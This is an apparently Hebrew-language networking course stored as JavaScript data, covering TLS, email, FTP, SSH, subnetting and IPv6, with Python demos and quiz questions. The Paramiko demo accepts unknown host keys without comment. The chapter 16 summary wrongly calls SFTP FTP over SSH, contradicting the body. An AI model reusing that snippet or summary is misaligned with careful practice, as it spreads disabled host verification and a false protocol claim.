        content: `
          <p>ספריית <code>requests</code> בפייתון מטפלת ב-TLS אוטומטית:</p>
          <div class="code-preview">
            <pre><code>import requests

# HTTPS – הכל מוצפן אוטומטית
response = requests.get('https://api.github.com/users/octocat')
print(response.status_code)  # 200
print(response.json()['name'])  # The Octocat

# בדיקת אישור SSL
response = requests.get('https://expired.badssl.com')
# ConnectionError: SSL certificate verify failed!

# לביטול בדיקה (לא בפרוד!)
response = requests.get('https://self-signed.badssl.com', verify=False)</code></pre>
          </div>
          <p class="demo-note">📋 requests מוודא אוטומטית את אישור ה-TLS. כשהאישור לא תקין – זורק שגיאה. <code>verify=False</code> מכבה את הבדיקה – אסור בסביבת ייצור!</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – HTTPS ואבטחה",
        intro: "<p>האם HTTPS = בטוח לחלוטין?</p>",
        blocks: [
          {
            title: "HTTPS מגן על התעבורה – לא על האתר",
            icon: "🔒",
            content: `<p>HTTPS מצפין את התקשורת בין הדפדפן לשרת. אבל אם האתר עצמו רע – HTTPS לא עוזר. אתר פישינג יכול להיות HTTPS תקין עם 🔒. <strong>החשיבה:</strong> 🔒 אומר "הקשר מוצפן" – לא "האתר אמין". תמיד בדקי את הדומיין, לא רק את המנעול.</p>`
          },
          {
            title: "MITM Attack – איך TLS מונע?",
            icon: "👥",
            content: `<p><strong>Man in the Middle</strong>: האקר יושב בין הדפדפן לשרת, מנסה לקרוא הכל. בלי TLS – מצליח. עם TLS: האקר לא יכול לזייף את אישור GitHub.com כי לא יכול לחתום עליו עם המפתח הפרטי של GitHub. הדפדפן יזהה אישור לא תואם ויחסום. <strong>למעט</strong> אם CA נפרץ (זה קרה – DigiNotar 2011) – אז האקר יכול לקבל אישור מזויף.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 15",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>HTTPS = HTTP over TLS. פורט 443. מוצפן end-to-end</li>
              <li>הצפנה סימטרית (AES) – מהירה, מפתח משותף. אסימטרית (RSA/ECC) – לחילופי מפתח</li>
              <li>TLS Handshake: Hello → Certificate → Key Exchange → Finished → AES</li>
              <li>Certificate מאמת שהשרת הוא מי שהוא טוען. CA חותם על האישור</li>
              <li>Let's Encrypt – CA חינמי. Self-Signed – לא מהימן לדפדפן</li>
              <li>🔒 = הקשר מוצפן, לא שהאתר אמין!</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 15",
        questions: [
          {
            q: "מה ההבדל בין HTTP ל-HTTPS?",
            a: "HTTP – טקסט גלוי, כל אחד שמסנן את הרשת יכול לקרוא. HTTPS – HTTP עטוף ב-TLS, כל התוכן מוצפן. תוקף, סיסמאות, פרטי כרטיס אשראי – לא נראים."
          },
          {
            q: "למה TLS משתמש ב-AES ולא ב-RSA לכל ההצפנה?",
            a: "RSA/ECC (אסימטרי) איטיים מאוד – מאות פעמים יותר מ-AES. TLS משתמש ב-RSA רק לחילופי מפתח (Handshake), ואז עובר ל-AES לכל שאר השיחה. זה פשרה בין אבטחה לביצועים."
          },
          {
            q: "מה CA ולמה צריך אותו?",
            a: "CA = גוף מהימן שחותם על אישורים. ללא CA, כל שרת היה יכול לטעון 'אני Google'. CA מאמת שהגוף שביקש אישור ל-google.com אכן שולט ב-google.com. הדפדפן סומך על CA-ים מסוימים שמובנים ב-OS."
          }
        ]
      }
    ]
  },
  {
    id: 16,
    title: "פרוטוקולי אפליקציה – Email, FTP, SSH",
    pages: [
      {
        type: "explanation",
        title: "email – SMTP, IMAP, POP3",
        content: `
          <p>דואר אלקטרוני משתמש ב-<strong>שלושה פרוטוקולים נפרדים</strong>:</p>
          <table class="content-table">
            <tr><th>פרוטוקול</th><th>פורט</th><th>תפקיד</th></tr>
            <tr><td>SMTP</td><td>25 / 587</td><td>שליחת אימייל (Send)</td></tr>
            <tr><td>IMAP</td><td>143 / 993</td><td>קריאת אימייל – מסנכרן (ממשיך בשרת)</td></tr>
            <tr><td>POP3</td><td>110 / 995</td><td>קריאת אימייל – מוריד ומוחק מהשרת</td></tr>
          </table>
          <div class="diagram-container">
            <svg viewBox="0 0 380 100" class="content-diagram">
              <rect x="10" y="30" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="54" text-anchor="middle" font-size="10">Alice</text>
              <rect x="110" y="20" width="70" height="60" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="145" y="45" text-anchor="middle" font-size="9">Mail Server</text>
              <text x="145" y="60" text-anchor="middle" font-size="9">(alice.com)</text>
              <rect x="200" y="20" width="70" height="60" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="235" y="45" text-anchor="middle" font-size="9">Mail Server</text>
              <text x="235" y="60" text-anchor="middle" font-size="9">(bob.com)</text>
              <rect x="300" y="30" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="335" y="54" text-anchor="middle" font-size="10">Bob</text>
              <path d="M 80 50 L 110 50" stroke="var(--accent-green)" stroke-width="2" marker-end="url(#arrowEmail)"/>
              <text x="95" y="43" text-anchor="middle" font-size="8" fill="var(--accent-green)">SMTP</text>
              <path d="M 180 50 L 200 50" stroke="var(--accent-gold)" stroke-width="2" marker-end="url(#arrowEmail2)"/>
              <text x="190" y="43" text-anchor="middle" font-size="8" fill="var(--accent-gold)">SMTP</text>
              <path d="M 300 50 L 270 50" stroke="#6090d0" stroke-width="2" marker-end="url(#arrowEmail3)"/>
              <text x="285" y="43" text-anchor="middle" font-size="8" fill="#6090d0">IMAP</text>
              <defs>
                <marker id="arrowEmail" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-green)"/></marker>
                <marker id="arrowEmail2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-gold)"/></marker>
                <marker id="arrowEmail3" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="#6090d0"/></marker>
              </defs>
            </svg>
            <p class="diagram-caption">SMTP לשליחה, IMAP לקבלה (נשאר בשרת)</p>
          </div>
          <p><strong>IMAP vs POP3</strong>: IMAP שומר הודעות בשרת – פותחת ממחשב ומהטלפון ורואה אותו דבר. POP3 מוריד ומוחק – הודעות רק על מכשיר אחד.</p>
          <p>הגרסאות המוצפנות: SMTPS (:465), IMAPS (:993), POP3S (:995) – עם TLS.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: SMTP בפייתון",
        content: `
          <p>שליחת אימייל בפייתון עם smtplib:</p>
          <div class="code-preview">
            <pre><code>import smtplib
from email.mime.text import MIMEText

# יצירת ההודעה
msg = MIMEText("שלום מפייתון!")
msg['Subject'] = "בדיקת SMTP"
msg['From'] = "alice@example.com"
msg['To'] = "bob@example.com"

# שליחה דרך Gmail
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
    server.login("alice@gmail.com", "app-password")
    server.send_message(msg)
    print("נשלח!")</code></pre>
          </div>
          <p class="demo-note">📋 SMTP_SSL מתחיל עם TLS מיידי. login() מאמת. send_message() שולח. Gmail דורש App Password (לא סיסמת חשבון) לאפליקציות צד שלישי.</p>
        `
      },
      {
        type: "explanation",
        title: "FTP – העברת קבצים",
        content: `
          <p><strong>FTP</strong> (File Transfer Protocol) – פרוטוקול להעברת קבצים בין מחשבים. פועל על פורט 21 (פקודות) + פורט 20 (נתונים).</p>
          <p>שני מצבי העברה:</p>
          <ul>
            <li><strong>Active mode</strong> – הלקוח פותח פורט, השרת מתחבר אליו (בעייתי עם Firewall)</li>
            <li><strong>Passive mode</strong> – השרת פותח פורט, הלקוח מתחבר (עובד עם Firewall – מומלץ)</li>
          </ul>
          <p>פקודות FTP: <code>LIST</code> (רשימת קבצים), <code>RETR filename</code> (הורדה), <code>STOR filename</code> (העלאה), <code>PWD</code> (תיקייה נוכחית), <code>CWD dir</code> (מעבר תיקייה).</p>
          <div class="code-preview">
            <pre><code>from ftplib import FTP

ftp = FTP('ftp.example.com')
ftp.login('user', 'password')
ftp.cwd('/pub')
print(ftp.nlst())  # רשימת קבצים

# הורדה
with open('file.txt', 'wb') as f:
    ftp.retrbinary('RETR file.txt', f.write)

ftp.quit()</code></pre>
          </div>
          <p><strong>SFTP</strong> (SSH File Transfer Protocol) – פרוטוקול העברת קבצים <em>נפרד לחלוטין מ-FTP</em> שרץ מעל SSH (פורט 22). שם מטעה – לא קשור ל-FTP הישן. <strong>FTPS</strong> – FTP מקורי עם TLS מעליו. FTP רגיל – נתונים כטקסט גלוי. <strong>לא להשתמש ב-FTP ישן ברשת ציבורית.</strong></p>
        `
      },
      {
        type: "explanation",
        title: "SSH – גישה מרוחקת מאובטחת",
        content: `
          <p><strong>SSH</strong> (Secure Shell) – פרוטוקול לגישה מרוחקת מוצפנת. פורט 22. מחליף את Telnet (לא מוצפן) לחלוטין.</p>
          <p>מה אפשר לעשות ב-SSH:</p>
          <ul>
            <li><strong>Terminal מרוחק</strong> – פתיחת shell על שרת מרוחק</li>
            <li><strong>SCP/SFTP</strong> – העברת קבצים מוצפנת</li>
            <li><strong>Port Forwarding</strong> – העברת תעבורה דרך הצינור המוצפן</li>
            <li><strong>Tunneling</strong> – גישה לשירותים פנימיים דרך SSH</li>
          </ul>
          <div class="code-preview">
            <pre><code># התחברות לשרת
ssh user@192.168.1.100

# התחברות עם מפתח (ללא סיסמה)
ssh -i ~/.ssh/id_rsa user@server.com

# העתקת קובץ לשרת
scp localfile.txt user@server.com:/home/user/

# Port Forwarding – גישה ל-localhost:8080 בשרת דרך 9090 מקומי
ssh -L 9090:localhost:8080 user@server.com</code></pre>
          </div>
          <p><strong>SSH Keys (מפתחות)</strong> – אימות חזק בלי סיסמה. יוצרים זוג מפתחות עם <code>ssh-keygen</code>. המפתח הציבורי מועלה לשרת (<code>~/.ssh/authorized_keys</code>). בחיבור – מוכיחים שיש לנו את הפרטי בלי לשלוח אותו.</p>
          <p>SSH בפייתון – ספריית <strong>Paramiko</strong>:</p>
          <div class="code-preview">
            <pre><code>import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('192.168.1.100', username='user', password='pass')

stdin, stdout, stderr = ssh.exec_command('ls -la')
print(stdout.read().decode())
ssh.close()</code></pre>
          </div>
        `
      },
      {
        type: "explanation",
        title: "פורטים ידועים – טבלה מלאה",
        content: `
          <p>פורטים ידועים (0–1023) מוקצים ל-Well-Known Services:</p>
          <table class="content-table">
            <tr><th>פורט</th><th>פרוטוקול</th><th>שכבה</th><th>שימוש</th></tr>
            <tr><td>20/21</td><td>FTP</td><td>TCP</td><td>העברת קבצים</td></tr>
            <tr><td>22</td><td>SSH</td><td>TCP</td><td>גישה מרוחקת מאובטחת</td></tr>
            <tr><td>23</td><td>Telnet</td><td>TCP</td><td>גישה מרוחקת (לא מוצפן!) ❌</td></tr>
            <tr><td>25</td><td>SMTP</td><td>TCP</td><td>שליחת אימייל</td></tr>
            <tr><td>53</td><td>DNS</td><td>UDP/TCP</td><td>מיפוי דומיין ל-IP</td></tr>
            <tr><td>67/68</td><td>DHCP</td><td>UDP</td><td>הקצאת IP אוטומטית</td></tr>
            <tr><td>80</td><td>HTTP</td><td>TCP</td><td>גלישה (לא מוצפן)</td></tr>
            <tr><td>110</td><td>POP3</td><td>TCP</td><td>קריאת אימייל</td></tr>
            <tr><td>143</td><td>IMAP</td><td>TCP</td><td>קריאת אימייל (מסונכרן)</td></tr>
            <tr><td>443</td><td>HTTPS</td><td>TCP</td><td>גלישה מוצפנת (TLS)</td></tr>
            <tr><td>993</td><td>IMAPS</td><td>TCP</td><td>IMAP מוצפן</td></tr>
            <tr><td>3389</td><td>RDP</td><td>TCP</td><td>Remote Desktop (Windows)</td></tr>
          </table>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 16",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>Email: SMTP (שליחה :25/:587), IMAP (קריאה מסונכרנת :143), POP3 (הורדה :110)</li>
              <li>FTP: פורט 21 (פקודות), 20 (נתונים). Passive mode עם Firewall. SFTP = FTP מעל SSH</li>
              <li>SSH: פורט 22. מוצפן. Terminal מרוחק, SCP, SFTP, Port Forwarding</li>
              <li>SSH Keys: אימות חזק ללא סיסמה. Paramiko – SSH מפייתון</li>
              <li>Telnet – לא מוצפן – לא להשתמש! SSH מחליף אותו</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 16",
        questions: [
          {
            q: "מה ההבדל בין IMAP לPOP3?",
            a: "IMAP – הודעות נשמרות בשרת, מסונכרן בין כל המכשירים. POP3 – מוריד הודעות למחשב ומוחק מהשרת. IMAP מתאים כשמשתמשים בכמה מכשירים. POP3 – כשרוצים הכל במחשב אחד."
          },
          {
            q: "למה SSH עדיף על Telnet?",
            a: "Telnet שולח הכל כטקסט גלוי – סיסמאות, פקודות, פלט. SSH מצפין את כל התקשורת. Telnet = שיחה בשידור חי שכולם שומעים. SSH = שיחה מוצפנת."
          },
          {
            q: "מה SSH Port Forwarding עושה?",
            a: "מאפשר לגשת לשירות ברשת מרוחקת דרך הצינור המוצפן. למשל: שרת DB שמאזין רק ל-localhost בשרת מרוחק – Port Forwarding מאפשר לגשת אליו מהמחשב המקומי דרך SSH."
          }
        ]
      }
    ]
  },
  {
    id: 17,
    title: "Subnetting ו-CIDR – חלוקת רשתות",
    pages: [
      {
        type: "explanation",
        title: "מה זה Subnetting?",
        content: `
          <p><strong>Subnetting</strong> (חלוקת תת-רשתות) – חלוקת רשת IP גדולה לרשתות קטנות יותר. למה?</p>
          <ul>
            <li><strong>אבטחה</strong> – הפרדה בין מחלקות (HR, Development, Guest)</li>
            <li><strong>ביצועים</strong> – Broadcast מוגבל לרשת הקטנה</li>
            <li><strong>ארגון</strong> – כל מחלקה/אתר מקבל טווח IP נפרד</li>
          </ul>
          <p>הבסיס: כל כתובת IP מורכבת מ-<strong>חלק רשת</strong> (Network part) ו-<strong>חלק מארח</strong> (Host part). ה-Subnet Mask קובע את הגבול.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 340 60" class="content-diagram">
              <rect x="10" y="15" width="160" height="30" rx="4" fill="var(--accent-green)" opacity="0.7"/>
              <text x="90" y="34" text-anchor="middle" font-size="11" fill="white">חלק רשת</text>
              <rect x="175" y="15" width="155" height="30" rx="4" fill="var(--accent-gold)" opacity="0.7"/>
              <text x="252" y="34" text-anchor="middle" font-size="11" fill="white">חלק מארח</text>
              <text x="90" y="58" text-anchor="middle" font-size="10" fill="var(--text-muted)">192.168.1</text>
              <text x="252" y="58" text-anchor="middle" font-size="10" fill="var(--text-muted)">.105</text>
            </svg>
            <p class="diagram-caption">IP 192.168.1.105 – הרשת היא 192.168.1, המארח הוא 105</p>
          </div>
        `
      },
      {
        type: "explanation",
        title: "CIDR – Classless Inter-Domain Routing",
        content: `
          <p><strong>CIDR</strong> – סימון /prefix. במקום לכתוב Subnet Mask מלא, כותבים את מספר ביטי הרשת:</p>
          <table class="content-table">
            <tr><th>CIDR</th><th>Subnet Mask</th><th>מספר כתובות</th><th>שימוש</th></tr>
            <tr><td>/8</td><td>255.0.0.0</td><td>16,777,214</td><td>ISP גדול</td></tr>
            <tr><td>/16</td><td>255.255.0.0</td><td>65,534</td><td>חברה גדולה</td></tr>
            <tr><td>/24</td><td>255.255.255.0</td><td>254</td><td>רשת משרד רגילה</td></tr>
            <tr><td>/25</td><td>255.255.255.128</td><td>126</td><td>חצי רשת /24</td></tr>
            <tr><td>/30</td><td>255.255.255.252</td><td>2</td><td>קישור P2P בין נתבים</td></tr>
            <tr><td>/32</td><td>255.255.255.255</td><td>1</td><td>מארח בודד</td></tr>
          </table>
          <p>מספר כתובות = 2^(32-prefix). מספר מארחים = כתובות - 2 (מוחסרים: כתובת רשת + broadcast).</p>
          <p><strong>דוגמה:</strong> רשת <code>192.168.1.0/24</code>:</p>
          <ul>
            <li>כתובת רשת: 192.168.1.0 (לא ניתן להקצות למארח)</li>
            <li>טווח מארחים: 192.168.1.1 – 192.168.1.254</li>
            <li>Broadcast: 192.168.1.255</li>
            <li>סה"כ מארחים: 254</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "כתובות IP פרטיות וציבוריות",
        content: `
          <p>ב-RFC 1918 הוגדרו טווחי IP <strong>פרטיים</strong> – לא ניתן לנתב אותם באינטרנט:</p>
          <table class="content-table">
            <tr><th>טווח</th><th>CIDR</th><th>מספר כתובות</th><th>שימוש</th></tr>
            <tr><td>10.0.0.0 – 10.255.255.255</td><td>10.0.0.0/8</td><td>16M</td><td>רשתות ארגוניות גדולות</td></tr>
            <tr><td>172.16.0.0 – 172.31.255.255</td><td>172.16.0.0/12</td><td>1M</td><td>רשתות בינוניות</td></tr>
            <tr><td>192.168.0.0 – 192.168.255.255</td><td>192.168.0.0/16</td><td>65K</td><td>בית, משרדים קטנים</td></tr>
          </table>
          <p>כתובות <strong>ציבוריות</strong> – שאר הטווחים. מוקצות על ידי <span dir="ltr">IANA → RIR → ISP → לקוח</span>.</p>
          <p><strong>כתובות מיוחדות:</strong></p>
          <ul>
            <li><code>127.0.0.0/8</code> – Loopback (127.0.0.1 = localhost)</li>
            <li><code>169.254.0.0/16</code> – APIPA – כשאין DHCP (Windows מקצה אוטומטית)</li>
            <li><code>0.0.0.0</code> – כל הכתובות (bind לכל ממשקים)</li>
            <li><code>255.255.255.255</code> – Limited Broadcast (לכל ברשת המקומית)</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "חישוב Subnetting – דוגמה מעשית",
        content: `
          <p>נניח שיש לנו רשת <code>192.168.10.0/24</code> (254 מארחים) ורוצים לחלק ל-4 תת-רשתות שוות:</p>
          <p>254 / 4 = 63.5 → צריך לפחות 64 מארחים לכל רשת → 2^6 = 64 → צריך 6 ביטים ל-Host → prefix = 32-6 = <strong>/26</strong></p>
          <table class="content-table">
            <tr><th>תת-רשת</th><th>טווח</th><th>Broadcast</th><th>מארחים</th></tr>
            <tr><td>192.168.10.0/26</td><td>.1 – .62</td><td>.63</td><td>62</td></tr>
            <tr><td>192.168.10.64/26</td><td>.65 – .126</td><td>.127</td><td>62</td></tr>
            <tr><td>192.168.10.128/26</td><td>.129 – .190</td><td>.191</td><td>62</td></tr>
            <tr><td>192.168.10.192/26</td><td>.193 – .254</td><td>.255</td><td>62</td></tr>
          </table>
          <p><strong>כלל מהיר:</strong> אם prefix = /26 → block size = 256/4 = 64. כל תת-רשת מתחילה במכפלה של 64: 0, 64, 128, 192.</p>
          <p><strong>טיפ:</strong> כדי למצוא אם כתובת ב-רשת מסוימת – AND לוגי של ה-IP עם ה-Subnet Mask. אם התוצאה = כתובת הרשת → הכתובת ב-רשת זו.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: Subnet בפייתון",
        content: `
          <p>מודול <code>ipaddress</code> בפייתון 3 עושה Subnetting בקלות:</p>
          <div class="code-preview">
            <pre><code>import ipaddress

# יצירת רשת
net = ipaddress.ip_network('192.168.1.0/24')
print(f"רשת: {net.network_address}")     # 192.168.1.0
print(f"Broadcast: {net.broadcast_address}")  # 192.168.1.255
print(f"מארחים: {net.num_addresses - 2}")  # 254

# בדיקה אם IP ברשת
ip = ipaddress.ip_address('192.168.1.50')
print(f"ב-רשת? {ip in net}")  # True

# חלוקה ל-4 תת-רשתות
for subnet in net.subnets(prefixlen_diff=2):
    print(f"{subnet} → {list(subnet.hosts())[0]} עד {list(subnet.hosts())[-1]}")

# supernet – ה-רשת הגדולה יותר
print(net.supernet())  # 192.168.0.0/23</code></pre>
          </div>
          <p class="demo-note">📋 ipaddress מכיל ip_network, ip_address, ip_interface. subnets() מחלק. supernet() מאחד. hosts() מחזיר את כל ה-IPs הניתנים להקצאה.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – Subnetting",
        intro: "<p>לדוגמאות ריאליות מהעולם:</p>",
        blocks: [
          {
            title: "ארכיטקטורת רשת של AWS",
            icon: "☁️",
            content: `<p>ב-AWS, VPC (Virtual Private Cloud) = רשת וירטואלית פרטית שלך. בוחרים CIDR בסיסי למשל <code>10.0.0.0/16</code> (65K כתובות). מתוכו יוצרים Subnets: Public (<code>10.0.1.0/24</code>, <code>10.0.2.0/24</code>) וPrivate (<code>10.0.10.0/24</code>, <code>10.0.11.0/24</code>). Public = יש גישה לאינטרנט. Private = ללא. Subnetting מגדיר את הארכיטקטורה של ה-Cloud.</p>`
          },
          {
            title: "האם 192.168.1.1 תמיד הנתב?",
            icon: "🤔",
            content: `<p>לא! 192.168.1.1 הוא כתובת Default Gateway של הנתב – אבל זה רק מוסכמה. הנתב יכול להיות 192.168.1.254, 10.0.0.1, כל כתובת שהוגדרה. בפועל: ראוטרים ביתיים בחרו 192.168.1.1 כברירת מחדל מנוחות – זה הפך למוסכמה. את יכולה לראות את הנתב האמיתי ב-ipconfig תחת "Default Gateway".</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 17",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>Subnetting = חלוקת רשת גדולה לרשתות קטנות. IP = חלק רשת + חלק מארח</li>
              <li>CIDR /prefix: /24 = 254 מארחים, /25 = 126, /30 = 2. כתובות = 2^(32-prefix) - 2</li>
              <li>כתובות פרטיות: 10.x.x.x, 172.16-31.x.x, 192.168.x.x – לא ניתנות לניתוב</li>
              <li>127.0.0.1 = loopback. 0.0.0.0 = כל ממשקים. 255.255.255.255 = Broadcast</li>
              <li>חישוב: prefix /26 = block size 64. כל תת-רשת מתחילה במכפלה של block size</li>
              <li>Python: import ipaddress – ip_network, subnets(), hosts()</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 17",
        questions: [
          {
            q: "כמה מארחים יש ברשת 10.0.0.0/20?",
            a: "/20 = 32-20 = 12 ביטים למארחים. 2^12 = 4096 כתובות. מארחים = 4096 - 2 = 4094 (מוחסרים כתובת רשת ו-broadcast). הטווח: 10.0.0.1 עד 10.0.15.254."
          },
          {
            q: "מה ההבדל בין כתובת פרטית לציבורית?",
            a: "כתובת פרטית (10.x.x.x, 172.16-31.x.x, 192.168.x.x) – לא ניתנת לניתוב באינטרנט. כתובת ציבורית – ניתנת לניתוב, ייחודית בעולם. NAT מאפשר למחשבים עם IP פרטי לגשת לאינטרנט דרך IP ציבורי אחד."
          },
          {
            q: "למה /30 משמש לקישורים בין נתבים?",
            a: "/30 = 4 כתובות, 2 מארחים. בקישור P2P בין שני נתבים צריך בדיוק 2 כתובות. /30 חוסך כתובות – /24 לקישור כזה יהיה בזבוז של 252 כתובות."
          }
        ]
      }
    ]
  },
  {
    id: 18,
    title: "IPv6 – גרסת האינטרנט החדשה",
    pages: [
      {
        type: "explanation",
        title: "למה IPv6?",
        content: `
          <p><strong>IPv4 כמעט נגמר.</strong> 4.3 מיליארד כתובות נשמעו הרבה ב-1981, אבל האינטרנט גדל לכל מכשיר: טלפון, רכב, מצלמת אבטחה, מקרר חכם. IANA הקצתה את בלוק ה-IPv4 האחרון ב-<strong>2011</strong>.</p>
          <p><strong>IPv6</strong> נוצר לפתרון: 128 ביטים = <strong>2<sup>128</sup> ≈ 3.4 × 10<sup>38</sup></strong> כתובות. מספיק לתת לכל גרגר חול על כדור הארץ כמה מיליארד כתובות.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 340 80" class="content-diagram">
              <rect x="10" y="15" width="130" height="50" rx="6" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="75" y="38" text-anchor="middle" font-size="11" fill="var(--text)">IPv4</text>
              <text x="75" y="54" text-anchor="middle" font-size="10" fill="var(--text-muted)">32 ביטים</text>
              <text x="75" y="68" text-anchor="middle" font-size="9" fill="var(--text-muted)">~4.3 מיליארד</text>
              <rect x="200" y="15" width="130" height="50" rx="6" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.8"/>
              <text x="265" y="38" text-anchor="middle" font-size="11" fill="white">IPv6</text>
              <text x="265" y="54" text-anchor="middle" font-size="10" fill="white">128 ביטים</text>
              <text x="265" y="68" text-anchor="middle" font-size="9" fill="white">3.4 × 10³⁸</text>
            </svg>
          </div>
          <p>ב-2024, כ-<strong>46%</strong> מהגלישה בגוגל כבר ב-IPv6. מפעיליות כמו T-Mobile ו-Comcast כבר משתמשות ב-IPv6 בברירת מחדל.</p>
        `
      },
      {
        type: "explanation",
        title: "פורמט כתובת IPv6",
        content: `
          <p>כתובת IPv6 = <strong>8 קבוצות של 4 ספרות הקסדצימליות</strong> מופרדות ב-<code>:</code>:</p>
          <div class="code-preview">
            <pre><code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code></pre>
          </div>
          <p><strong>כללי קיצור:</strong></p>
          <ul>
            <li>אפסים מובילים בכל קבוצה – ניתן להשמיט: <code>0db8</code> → <code>db8</code></li>
            <li>קבוצות אפסים רצופות – ניתן להחליף ב-<code>::</code> (פעם אחת בלבד):</li>
          </ul>
          <div class="code-preview">
            <pre><code>2001:0db8:85a3:0000:0000:8a2e:0370:7334
↓ קיצור
2001:db8:85a3::8a2e:370:7334</code></pre>
          </div>
          <p><strong>כתובות מיוחדות:</strong></p>
          <table class="content-table">
            <tr><th>כתובת</th><th>IPv4 מקביל</th><th>משמעות</th></tr>
            <tr><td><code>::1</code></td><td>127.0.0.1</td><td>Loopback</td></tr>
            <tr><td><code>::</code></td><td>0.0.0.0</td><td>כל הממשקים / לא מוגדר</td></tr>
            <tr><td><code>fe80::/10</code></td><td>169.254.x.x</td><td>Link-Local – ממשק מקומי בלבד</td></tr>
            <tr><td><code>ff02::1</code></td><td>255.255.255.255</td><td>Multicast – כל הצמתים</td></tr>
          </table>
        `
      },
      {
        type: "explanation",
        title: "סוגי כתובות IPv6",
        content: `
          <table class="content-table">
            <tr><th>סוג</th><th>Prefix</th><th>תיאור</th></tr>
            <tr><td><strong>Global Unicast</strong></td><td>2000::/3</td><td>ניתן לניתוב – כמו IPv4 ציבורי</td></tr>
            <tr><td><strong>Link-Local</strong></td><td>fe80::/10</td><td>אוטומטי על כל ממשק; לא ניתב</td></tr>
            <tr><td><strong>Unique Local</strong></td><td>fc00::/7</td><td>כמו RFC 1918 – פרטי, לא ניתב</td></tr>
            <tr><td><strong>Loopback</strong></td><td>::1/128</td><td>localhost</td></tr>
            <tr><td><strong>Multicast</strong></td><td>ff00::/8</td><td>אחד-לרבים. מחליף Broadcast</td></tr>
            <tr><td><strong>Anycast</strong></td><td>מ-unicast</td><td>אותה כתובת לכמה שרתים – הקרוב מנצח</td></tr>
          </table>
          <p><strong>אין Broadcast ב-IPv6!</strong> שידורי broadcast (כמו ARP) הוחלפו ב-Multicast ממוקד. <code>ff02::2</code> = כל הנתבים, <code>ff02::1</code> = כל הצמתים.</p>
          <p><strong>Link-Local</strong> נוצר אוטומטית על כל ממשק מה-MAC (EUI-64). שימושי ל-NDP ו-Router Discovery ללא צורך ב-DHCP.</p>
        `
      },
      {
        type: "explanation",
        title: "Header IPv6 – פשוט ומהיר יותר",
        content: `
          <p>IPv6 Header = <strong>40 בתים קבוע</strong> (בניגוד ל-IPv4 שהוא 20–60 בתים משתנה). פשוט יותר = נתבים מעבדים מהר יותר.</p>
          <p><strong>שינויים ב-IPv6 Header:</strong></p>
          <ul>
            <li><strong>אין Checksum</strong> – מוריד עומס מנתבים (TCP/UDP כבר בודקים)</li>
            <li><strong>אין Fragmentation בנתבים</strong> – רק המקור מפצל. נתבים מחזירים ICMPv6 "Packet Too Big" אם יותר מדי גדול</li>
            <li><strong>Flow Label</strong> – שדה 20-bit לזיהוי זרם תעבורה (QoS, load balancing)</li>
            <li><strong>Hop Limit</strong> – כמו TTL, מפחית ב-1 בכל hop</li>
            <li><strong>Extension Headers</strong> – Options הועברו ל-headers נוספים מחוץ לheader הבסיסי</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "NDP – מחליף ARP",
        content: `
          <p><strong>NDP</strong> (Neighbor Discovery Protocol) מחליף את ARP לגמרי ב-IPv6. עובד דרך <strong>ICMPv6</strong> ו-Multicast (לא Broadcast).</p>
          <p>הודעות NDP עיקריות:</p>
          <table class="content-table">
            <tr><th>הודעה</th><th>כמו ב-IPv4</th><th>תפקיד</th></tr>
            <tr><td>Router Solicitation (RS)</td><td>DHCP Discover</td><td>מחשב שואל "יש נתב?"</td></tr>
            <tr><td>Router Advertisement (RA)</td><td>DHCP Offer</td><td>נתב מכריז prefix, gateway, MTU</td></tr>
            <tr><td>Neighbor Solicitation (NS)</td><td>ARP Request</td><td>"מי מחזיק כתובת X?"</td></tr>
            <tr><td>Neighbor Advertisement (NA)</td><td>ARP Reply</td><td>"אני! הנה ה-MAC שלי"</td></tr>
          </table>
          <p><strong>SLAAC</strong> (Stateless Address Autoconfiguration) – מחשב יכול לקבוע לעצמו כתובת IPv6 ציבורית <em>ללא DHCP</em>:</p>
          <ol>
            <li>נתב שולח RA עם prefix, למשל <code>2001:db8::/64</code></li>
            <li>מחשב לוקח את ה-prefix + מחשב suffix מה-MAC (EUI-64)</li>
            <li>כתובת מלאה: <code>2001:db8::d4be:d9ff:fed6:0c2a</code></li>
          </ol>
          <p>פרטיות: SLAAC מ-MAC ידוע → Privacy Extensions (RFC 4941) יוצרות suffix אקראי שמשתנה.</p>
        `
      },
      {
        type: "explanation",
        title: "Dual-Stack ומנגנוני מעבר",
        content: `
